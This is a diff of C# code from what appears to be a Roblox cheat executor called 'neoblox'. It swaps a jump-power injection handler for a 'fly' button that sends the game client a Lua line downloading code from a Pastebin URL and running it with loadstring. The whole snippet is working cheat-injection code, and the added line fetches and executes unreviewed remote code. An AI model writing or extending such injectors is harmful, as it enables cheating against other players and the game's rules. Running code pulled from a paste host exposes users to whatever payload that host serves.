@@ -189,13 +189,9 @@ namespace neoblox
             }
         }
 
-        private void jumppowerTextbox_KeyDown(object sender, KeyEventArgs e)
+        private void onButtonFly_Click(object sender, EventArgs e)
         {
-            if (e.KeyCode == Keys.Enter)
-            {
-                string jumppower = jumppowerTextbox.Text;
-                wrdExploitAPI.SendLuaScript($"game.Players.LocalPlayer.Character.Humanoid.JumpPower = {jumppower}");
-            }
+            wrdExploitAPI.SendLuaScript("loadstring(game:HttpGet('https://pastebin.com/raw/ETeUDwvV', true))()");
         }
     }
 }
